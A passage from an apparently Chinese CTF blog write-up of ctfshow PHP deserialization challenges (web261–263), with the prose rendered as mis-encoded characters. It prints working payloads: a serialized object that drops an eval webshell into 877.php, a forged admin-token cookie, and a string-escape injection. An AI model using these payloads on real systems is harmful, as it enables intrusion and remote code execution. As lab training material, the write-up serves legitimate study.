class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>â€‹å…ˆæ‰”ä¸€ä¸ªè€ƒç‚¹ï¼š</p><blockquote><p>å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __unserialize () å’Œ __wakeup () ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œ åˆ™åªæœ‰ __unserialize () æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ__wakeup () æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚</p></blockquote><p>â€‹æ‰€ä»¥ä¸ç”¨æ­ç† <code>__wakeup</code>  ç›´æ¥æ‰“æœ¨é©¬ï¼š</p><p>â€‹å› ä¸ºå­˜åœ¨ file_put_contentsï¼Œæ‰€ä»¥åªéœ€è¦å°†æœ¨é©¬å†™å…¥æ–‡ä»¶é‡Œå³å¯ï¼Œç„¶åå°±æ˜¯ <code>__destruct</code> ï¼Œåœ¨è„šæœ¬è·‘å®Œçš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥è§¦å‘ï¼Œä¹‹åï¼Œæœ‰ä¸€ä¸ª if ($this-&gt;code==0x36d ï¼Œéœ€è¦æƒ³åŠæ³•é€šè¿‡ï¼Œå› ä¸ºæ˜¯å¼±æ¯”è¾ƒï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ª PHP çš„ç‰¹æ€§ï¼Œå…ˆæ‰§è¡Œä¸‹è¿™ä¸ªï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">0x36d</span> == <span class="string">&quot;877.php&quot;</span>;</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°è¾“å‡ºç»“æœæ˜¯ 1ï¼Œå¥½äº†ï¼Œå¯ä»¥ç›´æ¥æ¢­äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;877.php&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—® 877.php ç›´æ¥ RCE å³å¯ã€‚</p><h1 id="web262"><a class="markdownIt-Anchor" href="#web262">#</a> web262ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>â€‹æ–‡æ¡£æ³¨é‡Šç»™äº†ä¿¡æ¯ï¼Œæœ‰ä¸€ä¸ª message.php æ–‡ä»¶ï¼Œè®¿é—®ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œå…ˆç”¨</p><p>â€‹<strong>ç›´æ¥ååºåˆ—åŒ–ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥é€šè¿‡ cookie ä¼ ä¸€ä¸ª msg ä¸Šå»å³å¯å¾—åˆ° flag</p><p>â€‹<strong>å­—ç¬¦ä¸²é€ƒé€¸:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$t</span> = <span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line"><span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$umsg</span> ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#palyoad:f=1&amp;m=1&amp;t=1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web263"><a class="markdownIt-Anchor" href="#web263">#</a> web263:</h1><p>â€‹ä¸€ä¸Šæ¥æ˜¯ä¸ªç™»å½•æ¡†ï¼Œå¬è¯´è€ƒç‚¹æ˜¯ session ååºåˆ—åŒ–ï¼Œå…ˆè´´ä¸€ä¸ªæ–‡ç« ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vR1RMLUpVL3AvMTY4NTkwOTguaHRtbA==">session ååºåˆ—åŒ–</span></p><p>â€‹é¦–å…ˆï¼Œè®¿é—® www.zip è·å–æºç ã€‚</p><p>â€‹index.phpï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-03 16:28:37</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-06 19:21:45</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span><br><span class="line">if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"> setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line"> $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1,maximum-scale=1, minimum-scale=1&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;</span><br><span class="line">&lt;title&gt;ctfshowç™»é™†&lt;/title&gt;</span><br><span class="line">&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;pc-kk-form&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;CTFshow ç™»é™†&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;&quot; onsubmit=&quot;return false;&quot;&gt;</span><br><span class="line">&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">&lt;input id=&quot;u&quot; type=&quot;text&quot; placeholder=&quot;ç”¨æˆ·å&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">&lt;input id=&quot;pass&quot; type=&quot;password&quot; placeholder=&quot;å¯†ç &quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;pc-kk-form-btn&quot;&gt;</span><br><span class="line">&lt;button onclick=&quot;check();&quot;&gt;ç™»é™†&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">function check()&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:&#x27;check.php&#x27;,</span><br><span class="line">type: &#x27;GET&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">&#x27;u&#x27;:$(&#x27;#u&#x27;).val(),</span><br><span class="line">&#x27;pass&#x27;:$(&#x27;#pass&#x27;).val()</span><br><span class="line">&#125;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">alert(JSON.parse(data).msg);</span><br><span class="line">&#125;,</span><br><span class="line">error:function(data)&#123;</span><br><span class="line">alert(JSON.parse(data).msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹index.php é‡Œä¸»è¦çš„ php é€»è¾‘ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹check.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>= <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">[<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">],[</span><br><span class="line"><span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line"><span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line"><span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] //å¯†ç å¿…é¡»ä¸º<span class="number">128</span>ä½å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢çˆ†ç ´</span><br><span class="line">]</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line"><span class="comment">//ç™»é™†æˆåŠŸå–æ¶ˆæ¬¡æ•°ç´¯è®¡</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;æ¬¢è¿æ‚¨&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//ç™»é™†å¤±è´¥ç´¯è®¡æ¬¡æ•°åŠ 1</span></span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;ç™»é™†å¤±è´¥&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹inc/inc.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 